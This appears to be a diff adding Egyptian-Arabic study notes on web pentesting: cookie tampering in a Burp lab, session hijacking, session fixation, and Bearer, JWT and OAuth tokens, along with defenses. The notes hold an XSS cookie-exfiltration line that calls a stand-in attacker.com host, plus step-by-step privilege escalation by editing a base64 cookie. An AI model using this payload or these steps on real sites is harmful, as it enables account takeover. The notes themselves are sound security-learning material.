+مثلاً:
+
+role=admin
+
+👉 تقدر تعدلها 😈
+
+---
+
+# 🔥 مثال Attack (مهم تفهمه)
+
+لو لقيت:
+
+Set-Cookie: role=user
+
+جرب:
+
+role=admin
+
+👉 ممكن تعمل privilege escalation
+
+---
+
+# 🧪 عمليًا في Burp تعمل إيه؟
+
+1. Proxy ON
+2. Login
+3. شوف:
+    - Set-Cookie في response
+4. بعدها:
+    - Intercept request
+    - عدل Cookie
+
+---
+
+# 🧠 خلاصة تحفظها
+
+- Cookie = storage عند client
+- Session ID = جوه الكوكي
+- Flags = اللي بتحمي الكوكي
+
+---
+
+# 🔥 أهم 3 حاجات في الشغل
+
+ركز عليهم جدًا:
+
+- HttpOnly ❗
+- Secure ❗
+- SameSite ❗
+</code></pre>
+<p>Session Testing LABS:
+- lab 1
+[^11]</p>
+<p>[^11]: # أول حاجة: المحاضرة بتتكلم عن إيه؟</p>
+<pre><code>الموضوع الأساسي:
+
+👉 **Testing Session Management Schema**  
+يعني: اختبار أمان نظام الـ Sessions في الموقع
+
+والتكنيك الأساسي هنا:
+
+👉 **Cookie Tampering (التلاعب بالكوكيز)**
+
+---
+
+# 🧠 يعني إيه Session Management أصلاً؟
+
+لما تعمل Login:
+
+- السيرفر بيديك **Session ID**
+- بيتخزن غالبًا في **Cookie**
+- كل Request بعد كده بيبقى فيه الكوكي ده
+
+📌 يعني الكوكي = "أنا المستخدم ده"
+
+---
+
+# 🎯 هدف الاختبار (من OWASP WSTG)
+
+المحاضرة مبنية على:
+
+👉 **OWASP Web Security Testing Guide**
+
+الهدف:
+
+- تتأكد إن الـ session:
+    - مش ممكن يتسرق ❌
+    - مش ممكن يتوقع ❌
+    - مش ممكن يتعدل ❌
+
+---
+
+# ⚔️ Attack Flow (طريقة الهجوم)
+
+المحاضر قال 3 مراحل مهمين جدًا:
+
+## 1. 🧪 جمع الكوكيز (Collection)
+
+- تجمع session cookies من:
+    - نفس المستخدم
+    - مستخدمين مختلفين
+
+🎯 الهدف:  
+تشوف هل في pattern ولا عشوائية
+
+---
+
+## 2. 🧠 Reverse Engineering
+
+يعني:  
+تفهم الكوكي معمول إزاي
+
+تسأل نفسك:
+
+- هل فيه:
+    - username؟
+    - role؟
+    - user id؟
+- هل:
+    - مشفر؟ (Encryption) ✅
+    - ولا مجرد Encoding زي base64 ❌
+
+---
+
+## 3. 🧨 Manipulation (Tampering)
+
+تبدأ تلعب في القيم:
+
+مثلاً:
+
+role=guest → role=admin  
+admin=false → admin=true
+
+لو السيرفر صدقك → 💀 Vulnerability
+
+---
+
+# 🚨 أهم المشاكل (Vulnerabilities)
+
+## 1. Predictable Session ID
+
+لو مش random:
+
+👉 تقدر تخمن session بتاع حد تاني
+
+---
+
+## 2. Session Fixation
+
+- المهاجم يحدد session ID
+- الضحية يعمل login بنفس الـ session
+- المهاجم يدخل مكانه
+
+---
+
+## 3. Session Hijacking
+
+- تسرق الكوكي
+- تستخدمه
+
+👉 كأنك المستخدم
+
+---
+
+## 4. Authorization Bypass
+
+لو role موجود في الكوكي:
+
+👉 تغيره → تبقى Admin
+
+---
+
+## 5. Session Expiration مشكلة
+
+لو السيشن:
+
+- مبيخلصش ❌
+- أو طويل جدًا ❌
+
+👉 attacker يستخدمه بعدك
+
+---
+
+## 6. Missing Cookie Flags
+
+زي:
+
+- HttpOnly
+- Secure
+- SameSite
+
+❌ لو مش موجودين:
+
+- XSS
+- CSRF
+- MITM
+
+---
+
+## 7. Session في URL ❌
+
+زي:
+
+site.com?session=123
+
+💀 خطر جدًا:
+
+- بيتسجل في logs
+- بيتخزن في history
+
+---
+
+# 🔍 الجزء العملي (أهم جزء 💣)
+
+## 🎯 السيناريو
+
+موقع:
+
+- Secure Bank
+- login عادي
+
+## الأدوات:
+
+- Burp Suite
+- Firefox + FoxyProxy
+
+---
+
+# 🧪 الخطوات بالتفصيل
+
+## 1. تشوف الترافيك
+
+- تفتح Burp
+- تعمل proxy
+
+---
+
+## 2. تعمل Login
+
+email: james@secbank.com  
+password: password1
+
+---
+
+## 3. تلاحظ حاجة مهمة جدًا
+
+في Response:
+
+Set-Cookie: session=XXXXX
+
+🔥 ده هدفك
+
+---
+
+## 4. تحليل الكوكي
+
+لاحظ:
+
+== في الآخر
+
+📌 ده معناه غالبًا:  
+👉 Base64
+
+---
+
+## 5. تعمل Decode
+
+في Burp → Decoder
+
+تلاقي:
+
+logged_in=true  
+admin=false
+
+💀💀💀
+
+---
+
+# 🚨 هنا الكارثة
+
+السيرفر:
+
+❌ مش مشفر  
+❌ معتمد على client
+
+👉 يعني أنت تقدر تتحكم
+
+---
+
+## 6. التلاعب
+
+تغير:
+
+admin=false → admin=true
+
+---
+
+## 7. Encode تاني Base64
+
+---
+
+## 8. ترجع Burp → Intercept
+
+وتغير:
+
+Cookie: session=NEW_VALUE
+
+---
+
+## 9. تبعت الريكوست
+
+🎉 بقى عندك Admin
+
+---
+
+# 💥 ليه ده حصل؟
+
+لأن السيرفر:
+
+❌ وثق في الكوكي  
+❌ معملش validation server-side
+
+---
+
+# 🧠 أهم الدروس من اللاب
+
+## 1. Encoding ≠ Encryption
+
+- Base64 = شكله متغير بس
+- سهل جدًا تفكه
+
+---
+
+## 2. Never trust client
+
+أي حاجة جاية من المتصفح:  
+👉 تعتبر attacker controlled
+
+---
+
+## 3. لازم server يتحكم في:
+
+- role
+- auth
+- session
+
+---
+
+## 4. Cookies لازم تكون:
+
+- مشفرة أو signed
+- فيها flags:
+    - HttpOnly
+    - Secure
+    - SameSite
+
+---
+
+# 🔥 خلاصة المحاضرة
+
+المحاضرة دي بتقولك:
+
+👉 الكوكي ممكن يكون أخطر نقطة في الموقع
+
+ولو:
+
+- مش مشفر
+- فيه معلومات حساسة
+- السيرفر واثق فيه
+
+💀 يبقى الموقع "يتكسر بسهولة"
+
+---
+
+# 🧠 ربط بالـ Bug Bounty
+
+الحاجة دي اسمها:
+
+👉 **Client-side trust issue**  
+👉 **Insecure session management**  
+👉 **Privilege escalation via cookie tampering**
+
+🔥 دي vulnerabilities real ومطلوبة جدًا
+</code></pre>
+<p>Session Hijacking :
+[^12]</p>
+<p>[^12]: # أولًا: الفكرة الأساسية (افهمها كده ببساطة)</p>
+<pre><code>## 🎯 Session Hijacking يعني إيه؟
+
+👉 ببساطة:
+
+**أنا بسرق الـ session بتاعك… وببقى أنت 😈**
+
+يعني:
+
+- أنت عملت login
+- السيرفر اداك session ID
+- أنا سرقته
+- استخدمته
+
+💀 كده أنا دخلت حسابك بدون username/password
+
+---
+
+# ⚔️ الفرق بين Hijacking و Fixation (مهم جدًا)
+
+|النوع|بيحصل إمتى|الفكرة|
+|---|---|---|
+|**Session Hijacking**|بعد الـ login|بسرق session جاهز|
+|**Session Fixation**|قبل الـ login|بفرض عليك session|
+
+📌 دي أهم نقطة في المحاضرة كلها
+
+---
+
+# 💣 Session Hijacking بالتفصيل
+
+## 🧩 السيناريو الطبيعي
+
+### 1. User يعمل Login
+
+- السيرفر ينشئ:
+
+session_id = ABC123
+
+---
+
+### 2. السيرفر يبعت الكوكي
+
+Set-Cookie: session=ABC123
+
+---
+
+### 3. كل Request بعد كده:
+
+Cookie: session=ABC123
+
+---
+
+# 😈 الهجوم بيحصل هنا
+
+أنا كمهاجم:
+
+👉 أحاول أوصل للـ session ده
+
+---
+
+# 🧨 طرق سرقة الـ Session
+
+المحاضرة قالت أهم الطرق 👇
+
+---
+
+## 1. 🕵️‍♂️ Sniffing (التجسس على الشبكة)
+
+لو الموقع مش HTTPS:
+
+👉 أقدر أشوف الترافيك
+
+وألاقي:
+
+Cookie: session=ABC123
+
+💀 سهل جدًا
+
+---
+
+## 2. 🎭 Man-In-The-Middle (MITM)
+
+- أقعد بينك وبين السيرفر
+- أراقب كل حاجة
+
+👉 أسرق session
+
+---
+
+## 3. 💉 XSS (أخطر حاجة 🔥)
+
+أحقن كود زي:
+
+document.cookie
+
+أو:
+
+fetch("http://attacker.com?cookie=" + document.cookie)
+
+📌 النتيجة:
+
+- الكوكي يتبعتلي
+
+💀 وأنا أخده وأستخدمه
+
+---
+
+## 4. 🎲 Predictable Session IDs
+
+لو السيستم بيولد session كده:
+
+1001, 1002, 1003...
+
+👉 أقدر أتوقع session بتاع حد تاني
+
+---
+
+## 5. 📂 Logs / URL Leak
+
+لو session في URL:
+
+site.com?session=ABC123
+
+💀 ممكن يتسرب من:
+
+- logs
+- history
+- referrer
+
+---
+
+# 🔓 بعد ما أسرق السيشن
+
+## 🧨 Session Takeover
+
+أستخدمه في request:
+
+Cookie: session=ABC123
+
+👉 السيرفر يقول:  
+"أه ده المستخدم 👌"
+
+---
+
+# 💀 النتيجة (Exploitation)
+
+أقدر:
+
+- أشوف بياناته
+- أغير الباسورد
+- أعمل تحويل فلوس 💰
+- أعدل settings
+
+---
+
+# 🚨 ليه الهجوم ده خطير؟
+
+لأن السيرفر:
+
+👉 بيعتمد على session بس
+
+مش بيسأل:
+
+- أنت مين؟
+- IP إيه؟
+- جهازك إيه؟
+
+---
+
+# 🧠 نقطة مهمة جدًا
+
+السيرفر:
+
+&gt; "معاك session؟ خلاص أنت user"
+
+💀💀💀
+
+---
+
+# 🧪 مثال عملي (تخيله كده)
+
+1. User يدخل البنك
+2. ياخد session:
+
+session=XYZ999
+
+3. أنت تسرقه بـ XSS
+4. تستخدمه:
+
+👉 تدخل حسابه مباشرة
+
+---
+
+# 🔐 طب الحماية إزاي؟
+
+## 1. HTTPS فقط
+
+👉 يمنع sniffing
+
+---
+
+## 2. HttpOnly Cookie
+
+👉 يمنع JavaScript من قراءة الكوكي
+
+(يعني XSS مش هيعرف يسرقه بسهولة)
+
+---
+
+## 3. Secure Flag
+
+👉 الكوكي يتبعت بس على HTTPS
+
+---
+
+## 4. SameSite
+
+👉 يمنع CSRF
+
+---
+
+## 5. Regenerate Session ID
+
+👉 بعد login يتغير
+
+(ده ضد fixation)
+
+---
+
+## 6. Session Timeout
+
+👉 يقفل بسرعة
+
+---
+
+## 7. Bind Session بـ:
+
+- IP
+- User-Agent
+
+---
+
+# 🔥 الفرق العملي بين Hijacking و Fixation
+
+## 🧨 Hijacking
+
+User login → ياخد session → أنا أسرقه
+
+---
+
+## 🧨 Fixation
+
+أنا أديك session → أنت تعمل login → أنا أستخدمه
+
+---
+
+# 💡 ليه المحاضر شرحهم مع بعض؟
+
+لأن:
+
+👉 Fixation = خطوة قبل Hijacking
+
+يعني:
+
+- Fixation → يخلي عندك session
+- Hijacking → تستخدمه
+
+---
+
+# 🧠 خلاصة ذهبية
+
+## لو عايز تفتكرهم بسرعة:
+
+- Hijacking = **سرقة**
+- Fixation = **زرع**
+
+---
+
+# 🔥 ربط بالـ Bug Bounty
+
+دي بتتصنف كـ:
+
+- Broken Authentication
+- Session Management Issues
+
+وتلاقيها تحت:  
+👉 OWASP Top 10 (A2 / A7 حسب النسخة)
+
+---
+
+# 💣 سيناريو حقيقي (مهم جدًا)
+
+لو لقيت:
+
+- XSS + Cookie مش HttpOnly
+
+👉 مباشرة:  
+**Session Hijacking**
+
+---
+
+# 🧠 أهم حاجة تطلع بيها
+
+لو قدرت:
+
+- توصل للـ cookie
+- أو تتحكم فيه
+
+👉 أنت كده:  
+💀 دخلت حساب أي حد
+</code></pre>
+<p>Session Fixation :
+[^13]</p>
+<p>[^13]: ## أولًا: الفكرة الأساسية بسرعة</p>
+<pre><code>**Session Fixation = أنت (المهاجم) بتحدد الـ Session ID من قبل ما اليوزر يعمل Login**
+
+يعني:
+
+- بدل ما تسرق session جاهزة (زي hijacking)
+- أنت **بتزرع session وتخلي الضحية تستخدمها**
+
+---
+
+## 🧠 السيناريو خطوة بخطوة (زي الفيديو بالظبط)
+
+### 1️⃣ المهاجم ينشئ Session ID
+
+- يفتح الموقع عادي
+- السيرفر يديه Session ID (مثلاً: `ABC123`)
+
+💡 هنا النقطة المهمة:
+
+&gt; المهاجم **عارف session دي كويس جدًا** لأنها بتاعته
+
+---
+
+### 2️⃣ المهاجم يبعت Session ID للضحية
+
+بأي طريقة يخلي الضحية تستخدم نفس الـ session:
+
+#### الطرق:
+
+- 🔗 Link فيه session:
+
+    example.com/login?session=ABC123
+
+- 🍪 Cookie injection
+- ⚠️ JavaScript injection
+- 📩 Phishing message
+
+💡 الفكرة:
+
+&gt; الضحية تفتح الموقع **وهي أصلاً شغالة بنفس الـ session بتاعة المهاجم**
+
+---
+
+### 3️⃣ الضحية تعمل Login 😈
+
+- الضحية تكتب username + password
+- السيرفر يعمل authenticate
+
+❗ هنا الخطأ الخطير:
+
+&gt; السيرفر **ما بيغيرش الـ session ID بعد login**
+
+يعني:
+
+قبل login: session = ABC123  
+بعد login: session = ABC123 (نفسها ❌)
+
+---
+
+### 4️⃣ المهاجم يدخل بنفس الـ Session
+
+بما إن:
+
+- session = ABC123
+- والمهاجم عارفها
+
+👉 يقدر يدخل ويلاقي نفسه:
+
+&gt; Logged in كأنه الضحية بالظبط 😳
+
+---
+
+## ⚡ مثال بسيط جدًا يخليك تفهمها بسرعة
+
+تخيل:
+
+- أنت عامل مفتاح (session)
+- بدل ما تسرق مفتاح حد
+- **أنت بتدي له مفتاحك وتخليه يستخدمه**
+
+أول ما يدخل بيه:
+
+&gt; المفتاح ده بقى مفتاح بيته 🤯
+
+وأنت معاك نسخة منه 😏
+
+---
+
+## 🔥 الفرق القاتل بين Hijacking و Fixation
+
+|النقطة|Session Hijacking|Session Fixation|
+|---|---|---|
+|التوقيت|بعد login|قبل login|
+|الطريقة|سرقة session|زرع session|
+|السيطرة|تاخد session جاهزة|تتحكم في session من الأول|
+|الصعوبة|أصعب|أحيانًا أسهل|
+
+---
+
+## 🚨 ليه الهجوم ده بيشتغل أصلاً؟
+
+الفيديو قالك الأسباب المهمة جدًا 👇
+
+### 1. ❌ السيرفر مش بيغير session بعد login
+
+دي أكبر كارثة
+
+✔ المفروض:
+
+login → generate new session ID
+
+---
+
+### 2. ❌ Session ID ينفع تتحط في URL
+
+زي:
+
+?session=ABC123
+
+دي كارثة لأن:
+
+- بتتسجل في logs
+- بتتسرّب
+- سهلة التلاعب
+
+---
+
+### 3. ❌ Session IDs ضعيفة أو predictable
+
+زي:
+
+user1 → session=1001  
+user2 → session=1002
+
+المهاجم: 😏
+
+---
+
+### 4. ❌ مفيش expiration
+
+session شغالة forever
+
+💀 يعني:
+
+&gt; أي حد يعرفها = يفضل داخل للأبد
+
+---
+
+### 5. ❌ Cookies مش secure
+
+لو مفيش:
+
+- HttpOnly
+- Secure
+- SameSite
+
+👉 تبقى سهلة السرقة أو التلاعب
+
+---
+
+## 🎯 الخلاصة (أهم 3 سطور تحفظهم)
+
+- Session Fixation = المهاجم **بيحدد session قبل login**
+- الضحية تستخدمها → تعمل login
+- السيرفر ما يغيرهاش → المهاجم يدخل بسهولة
+
+---
+
+## 💡 ليه بيشرحوا Fixation عملي أكتر من Hijacking؟
+
+الفيديو لمح لنقطة مهمة 👇
+
+👉 Session Hijacking:
+
+- محتاج تسرق session (صعب شوية)
+
+👉 Session Fixation:
+
+- أسهل في الـ labs
+- تقدر تعمله بنفسك بسهولة
+</code></pre>
+<p>Token Based-Authentication :
+[^14]</p>
+<p>[^14]: # أولاً: Bearer Token (أبسط وأخطر نوع)</p>
+<pre><code>## 📌 الفكرة الأساسية
+
+كلمة **Bearer** معناها:
+
+&gt; "الشخص الذي يحمل التوكن يمتلك الصلاحية"
+
+يعني السيرفر لا يسأل:
+
+- مين المستخدم؟
+- هل هو فعلاً صاحب التوكن؟
+
+السيرفر يقول:
+
+&gt; معاك التوكن؟ خلاص ادخل.
+
+ده حرفياً زي:
+
+- كارت دخول شركة
+- أو مفتاح باب
+
+لو حد سرقه → يفتح الباب.
+
+---
+
+## 🔄 كيف يتم استخدامه؟
+
+### Step 1: Login
+
+المستخدم يعمل login بالباسورد.
+
+```
+POST /login{  "username": "mohamed",  "password": "123456"}
+```
+
+### Step 2: السيرفر يرد بتوكن
+
+```
+{  "access_token": "ABCD1234XYZ"}
+```
+
+### Step 3: كل request بعد كده يحمل التوكن
+
+```
+GET /api/profileAuthorization: Bearer ABCD1234XYZ
+```
+
+السيرفر يعمل:
+
+- lookup للتوكن في database
+- يتأكد إنه صالح
+- يعطي access
+
+---
+
+## ⚙️ من الداخل كيف يعمل؟
+
+Bearer token غالباً يكون:
+
+- random string
+- مخزن في database
+- مربوط بمستخدم
+
+Example DB:
+
+|token|user_id|expires|
+|---|---|---|
+|ABC123|42|2026|
+
+السيرفر يعمل query كل request.
+
+👉 ده معناه:  
+Bearer token = **stateful**  
+لأن السيرفر مخزن التوكن.
+
+وده الفرق الكبير مع JWT (لسه جايينله).
+
+---
+
+## ⏳ Expiration
+
+ليه لازم يكون short-lived؟
+
+لو حد سرقه:
+
+- وقت الاستغلال يكون محدود
+
+مثلاً:
+
+- 15 دقيقة
+- 1 ساعة
+
+---
+
+## 🚨 أهم المخاطر
+
+### 1) Token leakage
+
+لو التوكن ظهر في:
+
+- logs
+- URL
+- referer
+- local storage
+
+= account takeover.
+
+---
+
+### 2) No rotation
+
+لو التوكن عمره طويل → كارثة.
+
+---
+
+### 3) MITM
+
+لو بدون HTTPS → أي حد يسرقه.
+
+---
+
+## 🎯 امتى يستخدم؟
+
+- APIs بسيطة
+- Internal services
+- Microservices
+
+---
+
+# 🥈 ثانياً: JWT (الوحش الحقيقي 👑)
+
+ده أهم جزء في الكورس كله.
+
+JWT مختلف جذرياً عن Bearer.
+
+## 🤯 أهم فكرة
+
+JWT = السيرفر لا يخزن أي شيء.
+
+التوكن نفسه يحتوي كل المعلومات.
+
+ده اسمه:  
+**Self-contained token**
+
+---
+
+## 🧩 تركيب JWT
+
+يتكون من 3 أجزاء مفصولين بنقطة:
+
+```
+HEADER.PAYLOAD.SIGNATURE
+```
+
+خلينا نفككه.
+
+---
+
+## 1️⃣ Header
+
+يحدد:
+
+- نوع التوكن
+- خوارزمية التوقيع
+
+Example:
+
+```
+{  "alg": "HS256",  "typ": "JWT"}
+```
+
+يتحول إلى Base64.
+
+---
+
+## 2️⃣ Payload (الـ Claims)
+
+ده أهم جزء 👀  
+يحتوي بيانات المستخدم.
+
+Example:
+
+```
+{  "user": "mohamed",  "admin": false,  "exp": 1716239022}
+```
+
+أنواع الـ Claims:
+
+### Registered claims (قياسية)
+
+|Claim|المعنى|
+|---|---|
+|iss|issuer|
+|sub|subject (user id)|
+|exp|expiration|
+|iat|issued at|
+|aud|audience|
+
+---
+
+## ❗ أهم نقطة
+
+Payload **ليس مشفر**  
+هو فقط Base64.
+
+أي حد يقدر يقرأه.
+
+JWT = **Signed not encrypted**
+
+---
+
+## 3️⃣ Signature 🔐
+
+السيرفر يعمل:
+
+```
+HMACSHA256(  base64(header) + "." + base64(payload),  SECRET_KEY)
+```
+
+الـ secret key موجود عند السيرفر فقط.
+
+لما request يوصل:  
+السيرفر يعيد حساب التوقيع.
+
+لو مطابق → التوكن صحيح.
+
+---
+
+## 🤯 ليه JWT قوي؟
+
+السيرفر لا يحتاج:
+
+- database
+- session store
+
+مجرد يتحقق من التوقيع.
+
+ده يخلي:
+
+- scalable جداً
+- سريع جداً
+
+---
+
+## 🚨 أخطر فكرة في JWT
+
+السيرفر يثق في **كل ما داخل payload**  
+طالما signature صحيح.
+
+لو قدرت تغيّر payload وتوقّعه → أنت Admin 😈
+
+وهنا تبدأ هجمات JWT.
+
+---
+
+## أشهر استخداماته
+
+- SPA (React / Angular)
+- Mobile apps
+- Microservices
+- API Gateway
+
+---
+
+# 🥉 ثالثاً: OAuth Tokens
+
+ده نظام مختلف شوية.
+
+هدفه:
+
+&gt; السماح لتطبيق بالوصول لحسابك في خدمة أخرى بدون معرفة الباسورد.
+
+مثال:  
+Login with Google.
+
+---
+
+## 🎭 أطراف OAuth
+
+|الطرف|الوصف|
+|---|---|
+|Resource Owner|المستخدم|
+|Client|التطبيق|
+|Authorization Server|Google|
+|Resource Server|API|
+
+---
+
+## 🔄 Flow مبسط
+
+1️⃣ المستخدم يضغط Login with Google  
+2️⃣ يتم تحويله إلى Google  
+3️⃣ يدخل بياناته  
+4️⃣ Google يعطي Access Token  
+5️⃣ التطبيق يستخدم التوكن للوصول لبيانات Google
+
+---
+
+## أنواع OAuth Tokens
+
+### Access Token
+
+يستخدم للوصول للـ API.
+
+قصير العمر:
+
+- دقائق
+- ساعات
+
+---
+
+### Refresh Token
+
+يستخدم لإصدار Access Token جديد.
+
+طويل العمر:
+
+- أيام
+- شهور
+
+ده أخطر توكن في OAuth.
+
+---
+
+# 💥 مقارنة شاملة
+
+|خاصية|Bearer|JWT|OAuth|
+|---|---|---|---|
+|Server state|Yes|No|Hybrid|
+|يحتوي بيانات المستخدم|No|Yes|أحياناً|
+|يحتاج DB|Yes|No|Yes|
+|Scalability|Medium|High|High|
+|الأكثر استخداماً|APIs بسيطة|Modern apps|Social login|
+
+---
+
+# 🧠 عقلية البنتستر تجاه التوكنز
+
+ابدأ دائماً بالأسئلة:
+
+1. أين التوكن مخزن؟
+2. أين يتم إرساله؟
+3. هل له Expiry؟
+4. هل يمكن إعادة استخدامه؟
+5. هل يمكن التلاعب به؟
+6. هل يتم تدويره؟
+</code></pre>
 
 
 
